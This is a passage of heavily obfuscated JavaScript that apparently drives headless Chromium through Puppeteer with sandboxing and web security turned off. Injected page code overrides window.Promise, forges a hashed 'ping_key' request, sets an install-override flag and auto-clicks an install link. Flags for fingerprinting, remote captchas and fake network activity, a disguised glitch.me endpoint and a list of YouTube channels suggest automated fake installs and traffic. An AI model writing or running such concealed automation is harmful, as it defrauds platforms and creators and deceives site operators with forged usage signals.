                J[0x116d + 0x10 * 0x1f + -0x1 * 0x134d] = this['block'], J[K >> -0xf2 * -0x17 + 0x1dee + -0x33aa] |= x[0x4a8 + -0x1a2f + 0x158a & K], this['block'] = J[0xa08 + 0x5c9 + -0x25 * 0x6d], K >= 0x2254 + -0x11 * 0x175 + -0x957 && (this['hashed'] || this['hash'](), J[0x1412 + -0x1 * 0x2090 + 0x29 * 0x4e] = this['block'], J[-0x2633 + 0x7d3 * -0x3 + 0x3dbc] = J[-0xe6b + 0x455 + 0x15 * 0x7b] = J[-0x8e3 + -0x41e + 0xd03] = J[-0x2b * -0xe2 + -0x2483 * 0x1 + -0x170] = J[-0x2 * 0x1273 + -0x182b + -0x337 * -0x13] = J[-0x20c0 + -0x1964 + 0x3a29] = J[-0x1 * -0x1fb9 + -0x35a * 0x8 + -0x4e3] = J[0xfa7 * -0x2 + -0x2f * 0x2b + -0x273a * -0x1] = J[0x3 * -0xa05 + 0x185c + 0x3 * 0x1e9] = J[0x653 + 0x12a * 0xa + -0x11ee] = J[-0x1d * -0x29 + -0xb8b + -0x378 * -0x2] = J[0x1 * 0x144d + 0x1cd0 * -0x1 + 0x88e] = J[0x48 * 0x4e + 0x1d4e + 0x3332 * -0x1] = J[0x8 * -0x4ae + 0x47d * 0x1 + -0x180 * -0x16] = J[-0x1382 * -0x2 + 0x795 + -0x2e8b] = J[0x1 * -0x2345 + 0x1 * -0x14a1 + -0x12a7 * -0x3] = 0x1b6e + -0x4 * -0x106 + -0x1f86), J[0x2106 + 0x23bc + -0x44b4] = this['hBytes'] << 0x1f * -0x5e + -0xd9 * -0xd + 0x60 | this['bytes'] >>> 0x182d * 0x1 + 0x2561 + -0x3d71, J[0x3 * -0xa37 + -0xdf * -0x3 + 0x1c17] = this['bytes'] << -0xadf + 0x1 * 0x1fbb + -0x14d9, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x205 + -0x1 * -0x2437 + -0x262c; J < 0xa81 + 0x259 + -0xa * 0x141; ++J)
                K = Q[J - (-0x1 * 0x2677 + 0xad * -0x29 + 0x422f)] ^ Q[J - (0x1895 + 0x1 * -0x175e + -0x12f)] ^ Q[J - (-0x1a7 + -0x10 * 0x1f4 + 0x20f5)] ^ Q[J - (-0x79a + 0x12f0 + -0xb46)], Q[J] = K << 0x2 * -0xca4 + -0x1 * 0x254b + -0x5a * -0xb2 | K >>> -0x162d + -0xb7e + -0x6c2 * -0x5;
              for (J = 0x266 * 0x1 + 0x65d + 0x1 * -0x8c3; J < 0x90b + 0x1 * 0x113d + -0x1a34; J += 0x4d8 + -0x5 * -0x461 + 0x17c * -0x12)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xc00 + 0x1d0 * 0xe + 0x83 * -0x49 | L >>> -0x4 * 0x88a + 0x71c + -0x14b * -0x15) + (M & N | ~M & O) + P + (-0x3482e72d + 0x9bdb2d6e + -0xcd5cca8) + Q[J] << -0x196e + 0x9a * -0x3b + 0xe * 0x45a) << -0x14f2 + -0x95c + -0x1 * -0x1e53 | P >>> 0x455 * -0x5 + -0x161 * -0x7 + 0xc1d) + (L & (M = M << -0x10a5 * 0x2 + 0xa60 + 0x1708 | M >>> 0x8 * 0x2cf + 0x86e * 0x2 + -0x2752) | ~L & N) + O + (-0x7701dad0 + -0x67c1c0d8 + 0x139461541) + Q[J + (-0x14de + -0x45 * 0x3d + 0x6 * 0x638)] << 0x236 * 0x11 + 0x235f + -0x48f5) << 0x3ae * 0x8 + 0x23cf * -0x1 + 0x664 | O >>> 0x2 * -0x41c + 0x8 * -0x4e1 + 0x2f5b) + (P & (L = L << 0x15e1 + -0x85 + -0x2 * 0xa9f | L >>> 0x1254 + 0x249 + -0x5 * 0x41f) | ~P & M) + N + (0x1eeaece + 0x2c73e3c * -0x29 + 0xca7cc267) + Q[J + (0xd8d * -0x1 + -0x57b + -0x985 * -0x2)] << -0x1925 + -0x1103 + 0x2a28) << -0xb * -0x81 + -0x7ec + -0x2 * -0x133 | N >>> 0x247b + -0x2e * -0xa1 + -0x506 * 0xd) + (O & (P = P << -0xb2c + -0xd7 * -0x7 + 0x569 | P >>> -0x6 * 0x3ec + -0x1141 * -0x1 + 0x649) | ~O & L) + M + (0x3 * -0xbdd6358 + -0x640ad732 + 0xb3 * 0x1436d61) + Q[J + (0x12 * -0x7a + -0x15 * 0xbd + -0x404 * -0x6)] << 0xf69 + -0x18e4 + 0x97b) << -0x10f * 0xb + -0x1d15 + 0x28bf | M >>> 0x76 * -0x16 + -0x16d6 + -0x2115 * -0x1) + (N & (O = O << -0x9 * 0x416 + 0xe5f + 0x481 * 0x5 | O >>> 0x1 * 0x222f + 0x2682 + -0x48af) | ~N & P) + L + (-0x32ba25e * 0x35 + 0x3b2f9378 + 0xc75b8397) + Q[J + (0x4a5 + 0xbd4 + 0xb * -0x17f)] << 0x1d5 * 0xb + 0x234b + 0x5e * -0x97, N = N << 0x823 * 0x4 + 0x11 * 0x81 + 0x1 * -0x28ff | N >>> 0xde * -0x4 + -0x12fe * 0x2 + 0x2976;
              for (; J < -0x2597 + -0xc * 0x2d3 + 0x47a3; J += 0x18 * 0x5a + 0xe5d * 0x2 + -0x2525)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x7b * -0x41 + 0x26c7 + -0x45fd | L >>> -0x1033 + 0x2db + 0x1 * 0xd73) + (M ^ N ^ O) + P + (-0x9007e7a8 + -0x333c * -0x3dc77 + 0x390e7265) + Q[J] << -0x13c9 + -0x4b3 + -0x2 * -0xc3e) << 0x16ec + -0x2650 + 0x523 * 0x3 | P >>> -0x4 * -0x8c2 + -0xd5f + 0x59 * -0x3e) + (L ^ (M = M << 0x12c0 + 0x165 + -0x1407 | M >>> 0x4a * -0x16 + -0xf7c + 0x15da) ^ N) + O + (-0x1a1119d4 + -0xa6954cd5 * 0x1 + 0x81b5c6 * 0x257) + Q[J + (0x2229 + 0x7f * 0x29 + -0x367f)] << 0x1 * 0x1b32 + 0x711 * -0x1 + -0x1421 * 0x1) << -0x232f + -0x41 * -0x89 + -0x1 * -0x6b | O >>> -0x1446 + 0x1dc3 + 0x4b1 * -0x2) + (P ^ (L = L << 0x1277 + -0x1fc4 + 0x2af * 0x5 | L >>> -0xfb6 * -0x2 + 0x11d2 * -0x1 + 0x244 * -0x6) ^ M) + N + (-0x66246ee * 0x19 + -0x138f69a * -0x38 + 0x11 * 0xbe1b33f) + Q[J + (-0x2280 + 0x2311 + -0x8f)] << -0x5d7 + -0x4 * -0x40c + -0xa59) << 0xe8f * 0x2 + -0xa * -0x10d + -0x279b | N >>> 0x78e + -0x1148 + 0x3 * 0x347) + (O ^ (P = P << -0xb95 + -0x1a7b * 0x1 + 0x262e | P >>> -0x3c7 * 0x3 + 0x12 * 0x24 + 0x8cf) ^ L) + M + (-0x960c0f3e + -0x641a16b9 * 0x1 + 0x169001198) + Q[J + (-0x1246 * -0x2 + 0x27 * 0x9c + -0x3c4d * 0x1)] << 0x52 * 0x10 + -0x482 * -0x5 + 0x1baa * -0x1) << -0x4 * -0x1bd + -0x217 + -0x4d8 | M >>> 0x5 * -0x425 + 0xeb6 + 0x36 * 0x1d) + (N ^ (O = O << -0x3 * 0x209 + -0x1f7d + 0x25b6 | O >>> -0x25e4 + 0xcb9 + -0x5 * -0x509) ^ P) + L + (-0x8afdcd61 + -0x5 * 0x13c854fe + -0x8 * -0x2b982c3f) + Q[J + (0x2b * 0x62 + -0x2 * -0x605 + -0x1c7c)] << -0x1e4a + -0x1 * 0x263d + 0x4487, N = N << 0x1aca + 0x1 * -0x18a7 + 0x2f * -0xb | N >>> -0x81e + -0x1176 + 0x1 * 0x1996;
              for (; J < 0x2181 + 0x715 * 0x3 + -0x48b * 0xc; J += -0xd7f + -0x84c + 0x10 * 0x15d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x2af + 0x1669 * -0x1 + 0x191d | L >>> 0x1 * -0xb47 + 0xae1 + -0x3 * -0x2b) + (M & N | M & O | N & O) + P - (0x2a179255 + 0xad * -0x10bee3 + 0x32886c7 * 0x1a) + Q[J] << -0x2 * 0xe6e + 0x1173 + 0xb69) << 0x1 * -0x11be + 0x2f * 0x10 + 0x17 * 0xa5 | P >>> 0x55e + -0x418 * -0x6 + -0x1 * 0x1dd3) + (L & (M = M << -0x2 * -0x720 + 0x56 * -0x1 + 0x6e6 * -0x2 | M >>> 0xeba + -0x166 * 0x1a + -0xa * -0x22a) | L & N | M & N) + O - (0x732953e8 + 0xf2 * -0x5144f9 + -0x11 * -0x462b6be) + Q[J + (0x119 * 0x4 + -0xe * -0x1c9 + 0x6d * -0x45)] << -0x1329 + -0x2588 + -0x277 * -0x17) << 0x233e + 0x13ac + -0x36e5 | O >>> 0x28a + -0xb89 * 0x2 + -0x6e1 * -0x3) + (P & (L = L << -0x17bb + 0x1 * -0x157d + 0x2d56 | L >>> -0x7be + 0x1265 + -0xaa5) | P & M | L & M) + N - (-0x3 * 0x13483f29 + 0x1316d8 * 0xbc7 + 0x1 * -0x36150949) + Q[J + (-0x2 * -0x302 + 0xdc9 + 0x13cb * -0x1)] << -0x1260 + -0x1ed1 + 0x3131) << -0xcbe + -0x2 * -0xe75 + -0x1027 | N >>> 0xb2e + 0x3b2 + -0x13 * 0xc7) + (O & (P = P << 0x1200 + -0x5c6 * 0x2 + -0x656 * 0x1 | P >>> 0x441 + 0x1d13 + -0x2152) | O & L | P & L) + M - (0x24044e7a + -0x3ad * -0x30984f + 0x1 * -0x65bfe5b9) + Q[J + (0x1e95 + -0x884 + 0x3 * -0x75a)] << -0x2042 * -0x1 + 0xa3 + -0x20e5) << -0x1765 + 0x2f5 + 0x1475 * 0x1 | M >>> -0x1 * -0x1c62 + -0x1 * 0x796 + 0x1 * -0x14b1) + (N & (O = O << -0x15b5 + 0x3ec + -0x11e7 * -0x1 | O >>> 0x2234 + -0x5d0 + 0xad * -0x2a) | N & P | O & P) + L - (-0x1107cca * 0x2c + 0xb790dbd9 + -0x17d725fd) + Q[J + (0x520 * 0x2 + -0x121d * 0x1 + 0x7e1)] << -0xbdb + -0x1e35 + -0x2 * -0x1508, N = N << -0x1f0 * -0x11 + -0x559 * 0x2 + 0x760 * -0x3 | N >>> -0x1ccd + -0x7a8 + 0x2477;
              for (; J < -0x12c2 + 0x4a * -0x49 + 0x282c; J += -0x1 * -0x335 + -0x23d3 + 0x20a3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x1439 + 0x1927 + -0x4e9 | L >>> -0x1d40 + -0x18d * 0x11 + 0x37b8) + (M ^ N ^ O) + P - (0xc93ba89 * -0x5 + -0x12 * -0x4cca459 + 0x1e1c5495) + Q[J] << 0x404 * 0x1 + 0x7 * -0x6d + -0x109) << -0x1 * 0x1091 + -0x20 * 0x52 + 0x8f2 * 0x3 | P >>> -0x10eb * -0x1 + 0x1 * -0x3fd + -0x1 * 0xcd3) + (L ^ (M = M << -0x1a3a + -0xa93 * 0x1 + 0x1 * 0x24eb | M >>> -0x2291 + -0x1057 * -0x2 + 0x1e5) ^ N) + O - (0x69a9068 + 0x5f0 * -0xd224e + 0x7cfe5ce2) + Q[J + (0x1758 + 0x21 * 0x36 + 0x1e4d * -0x1)] << 0x9b * -0x3c + 0x4b1 * -0x3 + 0x3267) << -0x1060 + 0x1eab + -0x1 * 0xe46 | O >>> 0x2239 + 0xb8 * -0x3 + 0x1ff6 * -0x1) + (P ^ (L = L << -0x421 * -0x7 + 0x2d5 * -0x3 + -0x144a | L >>> 0x35b * -0x3 + 0x767 + 0x2ac) ^ M) + N - (-0x1 * 0x2cfbcf14 + 0x5e043065 + -0x6d * -0xac29d) + Q[J + (-0x1 * 0x20c8 + -0x20 * 0x107 + 0xd22 * 0x5)] << 0x2d1 * 0x7 + -0x1a0f + -0x74 * -0xe) << -0x1f55 + -0x1e60 + 0x1edd * 0x2 | N >>> -0x1 * 0x165e + 0xf6b + 0x70e) + (O ^ (P = P << 0x1ac6 + 0x9a5 + -0x244d * 0x1 | P >>> 0x2250 + -0x212d + -0x121) ^ L) + M - (0x20575 * 0x129 + 0x7 * -0xb0e35f7 + 0x80a8632e) + Q[J + (-0x38c * 0x5 + 0x224 + -0x55 * -0x2f)] << -0x232d + -0x223f + -0x3 * -0x1724) << 0xac8 + 0x1f8d * -0x1 + 0x14ca * 0x1 | M >>> 0x615 + -0x1 * -0xa85 + -0x29 * 0x67) + (N ^ (O = O << 0x1a39 + 0xdd3 * -0x2 + -0x4f * -0x5 | O >>> 0x24eb * -0x1 + -0x10c2 + 0x35af) ^ P) + L - (-0x2 * 0x1e0901ba + 0x4ef27267 + 0x22bccf37 * 0x1) + Q[J + (0x1 * 0x254f + -0x2563 + 0x18)] << -0xfe * 0x9 + -0x2 * 0x121d + 0x14 * 0x242, N = N << -0x1 * 0xca9 + -0x101 * 0x1f + 0x2be6 | N >>> 0x119 * 0x9 + 0x1 * -0x1990 + 0xfb1;
              this['h0'] = this['h0'] + L << -0x178d * -0x1 + -0x67 * 0x2e + -0x50b, this['h1'] = this['h1'] + M << -0xb77 + 0xaea + 0x8d, this['h2'] = this['h2'] + N << 0x149a + -0x8eb + -0xbaf * 0x1, this['h3'] = this['h3'] + O << -0xbed * 0x2 + -0x1490 + 0x2c6a, this['h4'] = this['h4'] + P << -0x38b * 0x5 + -0x1 * -0x1532 + -0x51 * 0xb;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x2ea + -0x241b + 0x35 * 0xbd & 0x2 * -0xd3f + -0xbbc + 0x2649] + w[J >> 0x13d9 + 0xb59 + -0x1f1a & 0x2235 + -0xf02 + -0x15e * 0xe] + w[J >> 0x20 * 0x72 + 0x1e85 + -0x2cb1 & -0x30f + -0x6a9 + 0x9c7] + w[J >> -0x1 * 0x6cd + 0x8cf + 0xa6 * -0x3 & -0x1e09 + 0x1a25 + -0x3f3 * -0x1] + w[J >> 0xda * 0x4 + 0x1199 + -0x14f5 & 0x149d + 0x8f3 + -0x53 * 0x5b] + w[J >> 0xd43 * 0x1 + -0x1d14 + -0x1 * -0xfd9 & 0x1 * 0xcbb + 0x886 * -0x3 + 0x1 * 0xce6] + w[J >> 0xf5a + -0x1be0 + 0x6 * 0x217 & -0xe38 + -0x1e5 * -0x8 + 0x1 * -0xe1] + w[0x2328 + 0x13 * 0x11f + 0x1 * -0x3866 & J] + w[K >> 0x14e * 0x17 + -0x1d2 * -0x13 + -0x407c & 0x1ca0 + 0x985 + 0x1a * -0x177] + w[K >> -0xd61 + 0x1c * -0xe3 + 0x264d & -0x1996 + 0x1701 + 0x2a4] + w[K >> 0x195a + -0x1e + -0x1928 & -0x1 * -0x1ea9 + 0xaae + -0x2948] + w[K >> -0x22a * 0x2 + 0x132d * 0x2 + -0x21f6 & -0x29 * 0x36 + -0x1 * -0x7e1 + -0x2 * -0x6a] + w[K >> 0x1 * -0x25ef + 0x14bf + 0x113c & -0x56c * -0x5 + 0x7e7 + -0x117a * 0x2] + w[K >> 0x1dd2 + -0x968 + -0x1462 & 0x1bb3 + -0x3 * 0x580 + -0x1 * 0xb24] + w[K >> 0x1 * -0x167c + 0x1e3d + 0x7bd * -0x1 & 0x29 * 0x9d + -0xf28 + 0x52 * -0x1f] + w[-0x79 * -0x9 + 0x1 * 0xc7a + 0xc2 * -0x16 & K] + w[L >> -0x29f + -0xb47 + -0x146 * -0xb & -0x1665 + -0x1885 + 0x25 * 0x145] + w[L >> -0x1d58 * -0x1 + 0x1dcf * -0x1 + 0x8f & -0x1c15 + -0x154 + 0x1d78] + w[L >> -0x14 + 0x1b59 * -0x1 + -0x3 * -0x92b & -0x14b2 + 0x1185 + 0x33c] + w[L >> 0x12 * 0x120 + 0x76e + -0xdcf * 0x2 & 0x1182 + 0x128 * -0x8 + -0x1 * 0x833] + w[L >> 0x288 * -0x6 + 0x67 * 0x27 + -0x75 & 0x417 + 0x1afc + -0x5 * 0x634] + w[L >> 0x904 + -0x558 + -0x3a4 & -0x139 * -0x7 + 0x15 * 0x1a1 + -0x2ab5 * 0x1] + w[L >> -0x13c + -0x5 * 0x21a + 0xbc2 & 0x12d7 + -0x1674 + 0x3ac] + w[-0x2 * -0x763 + 0xa78 + 0x399 * -0x7 & L] + w[M >> -0x4 * -0x33b + 0x1 * -0x1ea1 + -0x11d1 * -0x1 & -0x1113 + -0x1dd7 + 0x2ef9] + w[M >> -0xc49 + 0x6d7 + 0x58a & -0x1f1e + -0x24b * 0x1 + 0x2178] + w[M >> -0x1ea1 + -0x8b8 + 0x276d & -0x156c + -0x928 + 0x1ea3] + w[M >> -0x1d2b * 0x1 + -0x1850 + -0x5f3 * -0x9 & -0x24ba + 0x1a * 0xb + 0x23ab] + w[M >> 0x48d + -0x1d00 + 0x187f & 0x18ad + -0x1 * -0xf2b + -0x27c9] + w[M >> -0xc9d * -0x1 + 0x5d8 + -0x126d & 0x174c + 0x6 * 0x39f + -0x2cf7] + w[M >> -0x117a + -0x10 * -0x1a6 + 0x8e2 * -0x1 & 0x27b * 0xa + -0x1 * -0x2542 + -0x27 * 0x197] + w[-0xb75 * -0x1 + 0x754 + -0x12ba & M] + w[N >> 0x11ef + 0x3c7 * 0x8 + -0x300b & 0x9a8 * -0x1 + 0x20ea + -0x1733] + w[N >> 0x13d0 + 0x1 * -0x20c1 + -0x47 * -0x2f & -0x742 * -0x5 + 0x1442 + -0x387d * 0x1] + w[N >> -0x1eb6 + 0x13b * -0xb + 0x2c53 & -0x2300 + 0x1 * -0x4f5 + 0x2804] + w[N >> -0x7f * -0x4a + 0x1 * 0x1983 + -0x3e29 * 0x1 & -0x1be + -0x56 * -0x61 + 0x47 * -0x6f] + w[N >> 0x1070 + -0xefa * -0x1 + -0x37 * 0x92 & 0x15ca + 0x2 * -0xa29 + -0x13 * 0x13] + w[N >> 0x1b2f * 0x1 + -0x79 * -0x1a + -0x2771 & 0x1b8c + -0x1 * 0xbee + -0xf8f] + w[N >> -0x2e * 0x9f + 0xf31 * 0x2 + -0x1cc & 0x62 * 0x35 + 0x8e8 + -0x1d23] + w[0x525 + 0x1d39 + -0x1 * 0x224f & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x23f * -0xb + -0x814 + -0x1089 & 0x1f + -0x5a1 * 0x1 + 0x681,
                J >> -0x5a7 * 0x4 + -0x431 * -0x5 + 0x1b7 & -0x3 * 0xc16 + -0x1899 * 0x1 + 0x1a * 0x261,
                J >> 0x1d5f * -0x1 + 0x12f + 0x1c38 & 0x3 * 0x117 + 0x44f * 0x9 + -0xdaf * 0x3,
                -0x6fa + 0x85f + -0x66 & J,
                K >> 0x1b4b + -0x1d29 + 0x1f6 & -0x683 * 0x3 + -0x20c1 + 0x3549,
                K >> -0x17 * -0x1 + -0x188 * -0x17 + -0x509 * 0x7 & -0xe28 + 0x5ed + -0x1 * -0x93a,
                K >> 0x117f + 0x771 + -0x18e8 & 0x81b + 0x1 * 0xd46 + -0x1462,
                0x1561 + 0x91c + -0x2 * 0xebf & K,
                L >> -0x1744 + 0xab * -0xd + 0x200b & 0x24cf * -0x1 + 0x132f + 0x7 * 0x2a9,
                L >> -0x226a + -0x2151 + 0x43cb & 0x2016 + 0x14 * 0x19b + -0x3f33 * 0x1,
                L >> -0x1be5 * 0x1 + -0x1db3 + 0x39a0 & -0x1fb2 + 0xe5 * 0x2 + 0x9 * 0x36f,
                -0x277 * 0xe + 0x7d4 + 0xd * 0x221 & L,
                M >> -0x1bb + 0x22ec + -0x2119 & -0x1836 + 0x2420 + -0x5 * 0x22f,
                M >> 0x2462 * -0x1 + -0x13 * -0x43 + 0x47f * 0x7 & 0x1bd7 + -0x245 * 0x1 + -0x1893,
                M >> 0x211 * 0x1 + 0x4 * 0x89b + -0x2475 & 0x2a7 * 0x9 + 0x18 * -0xba + -0x570,
                -0x81d * 0x3 + 0x1 * 0x1d2b + -0x3d5 & M,
                N >> 0x14bf + 0xd18 + 0x21bf * -0x1 & 0xee9 + -0x19 * -0x11f + -0x29f1,
                N >> 0x92 + -0x175 * -0x8 + -0x2 * 0x615 & 0x22e1 * 0x1 + -0x3f1 * -0x7 + -0x3d79,
                N >> 0x751 * -0x2 + -0x1433 + 0x22dd & -0x5d * 0x51 + -0x1e1c * 0x1 + 0x3c88,
                -0x1168 + 0x2 * -0x605 + 0x1e71 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x419 + 0x1 * -0x1674 + 0x126f), (K = new DataView(J))['setUint32'](-0x23 * 0x34 + -0xe01 + -0x73 * -0x2f, this['h0']), K['setUint32'](0x53e * 0x5 + 0x9b1 + 0x23e3 * -0x1, this['h1']), K['setUint32'](-0x1 * -0x3e0 + -0x13cf + 0xff7, this['h2']), K['setUint32'](0x1ea3 + -0xda1 + 0x87b * -0x2, this['h3']), K['setUint32'](0x4b5 + -0x1232 * -0x1 + 0x3 * -0x79d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x9db + -0xd * -0x11 + -0x2 * -0x47f];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x565 * 0x2 + -0x211d + 0x2be7;
            J[-0x24b1 + 0x1cb7 * -0x1 + -0x2e * -0x16c]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x511 * 0x3 + 0x6 * -0x32b + 0x2235] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1 * 0x79a + -0x937 + 0x45 * 0x6), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x7f * 0xd + 0x1e5a + -0x24cc;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0xdcd * -0x1 + -0x1 * -0x7e + -0x86f * 0x1), Promise['resolve'](-0x254e * -0x1 + 0x3d2 + -0x291f);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x134f * -0x1 + -0x8 * 0x34b + -0x1 * -0x709; j < 0x111a * -0x2 + 0x68d * -0x5 + -0x6 * -0xb29; j++)
    i();
}
const NETWORK_PATIENCE = -0x283 * 0x9 + 0x2228 + 0x3 * 0x691 + (0x183a + -0x1 * -0x426 + 0x1a * -0xa4) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x7be * 0x5 + -0x6 * -0x151 + -0x2e99) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + X(0xc) + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + Y(0xa, '1AWN') + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x11 * 0x1fd + 0x1069 * 0x1 + 0x2 * -0x191b; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1be3 + 0xc2e * 0x1 + -0x1 * 0x2811);
    let h = e[f];
    if (b['IIRbvD'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x239d + 0x13b0 + -0x507 * 0xb, s, t, u = 0xd0b + 0x173 + 0x2 * -0x73f; t = n['charAt'](u++); ~t && (s = r % (-0x1 * -0x2203 + 0x227 + -0x2426) ? s * (0x479 + 0x1bb8 + -0x25 * 0xdd) + t : t, r++ % (-0x88 + -0x1 * -0x12cf + -0x11 * 0x113)) ? p += String['fromCharCode'](-0x44 * 0x29 + 0x23a7 + -0x17c4 & s >> (-(0x449 * -0x7 + -0x15fa + 0x33fb) * r & 0x13df + -0x860 + -0xb79)) : -0x4 * -0x555 + 0x1a88 + -0x2fdc) {
          t = o['indexOf'](t);
        }
        for (let v = 0x92f * 0x1 + 0x1e9 + 0x1 * -0xb18, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1 * -0x509 + 0x2 * -0xf5a + 0x23cd))['slice'](-(-0x1729 + -0x9a5 + 0x20d0));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x2 * 0xa70 + 0x24c + 0x1294,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1 * -0x12b6 + 0x367 * -0xb + 0x12b7; u < -0x1 * 0x2296 + 0x32 * 0x47 + 0x8b * 0x28; u++) {
          p[u] = u;
        }
        for (u = -0xe0e + 0xe0b * -0x1 + 0x1c19; u < 0x1ffa + 0xecc + -0x2dc6; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1 * -0x1279 + 0x415 + -0x158e), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x712 * 0x4 + -0x7 * 0x107 + 0x2379, q = -0x2261 * 0x1 + 0x162b + 0xc36;
        for (let v = -0x1f * -0x102 + -0xa57 * 0x3 + -0x39; v < n['length']; v++) {
          u = (u + (-0x169 * -0x11 + 0x7 * 0x4c3 + 0x1 * -0x394d)) % (0xed1 + 0x71f + -0x14f0), q = (q + p[u]) % (-0x1b57 * 0x1 + -0x1d77 + 0x39ce), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * -0x162d + 0xb9e + -0x73 * 0x49)]);
        }
        return t;
      };
      b['JOYEUK'] = m, c = arguments, b['IIRbvD'] = !![];
    }
    const j = e[0x1210 + 0x54d + -0x175d],
      k = f + j,
      l = c[k];
    return !l ? (b['MpDLkw'] === undefined && (b['MpDLkw'] = !![]), h = b['JOYEUK'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let searchTerms = [];
